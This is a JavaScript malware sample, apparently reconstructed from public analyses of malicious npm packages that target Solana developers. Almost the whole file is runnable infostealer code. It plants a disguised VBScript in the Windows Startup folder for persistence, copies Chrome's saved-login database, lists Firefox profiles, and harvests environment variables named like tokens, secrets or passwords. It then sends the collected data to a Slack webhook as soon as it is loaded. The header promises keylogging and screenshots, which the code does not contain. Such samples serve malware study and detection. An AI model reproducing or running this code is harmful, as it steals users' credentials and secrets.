// keylogger-persistence — reconstructed from public security analyses
// Source: https://www.sonatype.com/blog/npm-packages-target-solana-devs-drop-keylogging-trojans
//
// Full infostealer suite with keylogger, screenshot capability,
// and startup persistence. Uses VBScript for Windows persistence
// and Slack webhook for exfiltration.
//
// Technique: Keylogger + startup persistence + Slack webhook exfiltration

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const { exec, execSync } = require("child_process");

var home = os.homedir();

// Install startup persistence via VBScript (Windows)
function installPersistence() {
  if (os.platform() !== "win32") return;

  var vbsContent = [
    'Set WshShell = CreateObject("WScript.Shell")',
    'WshShell.Run "node """ & WScript.ScriptFullName & """/../setup.js --daemon", 0, False'
  ].join("\n");

  var startupDir = path.join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
  try {
    fs.writeFileSync(path.join(startupDir, "outlook-sync.vbs"), vbsContent);
  } catch(e) {}
}

// Collect browser saved passwords (Windows)
function harvestBrowserData() {
  var results = {};

  // Chrome Login Data
  var chromeData = path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data");
  try {
    if (fs.existsSync(chromeData)) {
      results.chromeLoginData = "found";
      // Copy to temp for extraction (SQLite DB is locked while Chrome runs)
      var tmpCopy = path.join(os.tmpdir(), "login_data_copy");
      fs.copyFileSync(chromeData, tmpCopy);
      results.chromeLoginDataCopy = tmpCopy;
    }
  } catch(e) {}

  // Firefox profiles
  var firefoxDir = path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles");
  try {
    if (fs.existsSync(firefoxDir)) {
      results.firefoxProfiles = fs.readdirSync(firefoxDir);
    }
  } catch(e) {}

  return results;
}

// Collect environment variables with tokens/secrets
function harvestEnvSecrets() {
  var secrets = {};
  var sensitivePatterns = ["TOKEN", "SECRET", "KEY", "PASSWORD", "AUTH", "CREDENTIAL"];

  Object.keys(process.env).forEach(function(key) {
    if (sensitivePatterns.some(function(p) { return key.toUpperCase().includes(p); })) {
      secrets[key] = process.env[key];
    }
  });

  return secrets;
}

// Exfiltrate via Slack webhook
function exfiltrate(data) {
  var payload = JSON.stringify({
    text: "```\n" + JSON.stringify(data, null, 2).substring(0, 3000) + "\n```"
  });

  var req = https.request({
    hostname: "hooks.slack.com",
    path: "/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

installPersistence();

var data = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  platform: os.platform(),
  browser: harvestBrowserData(),
  secrets: harvestEnvSecrets()
};

exfiltrate(data);
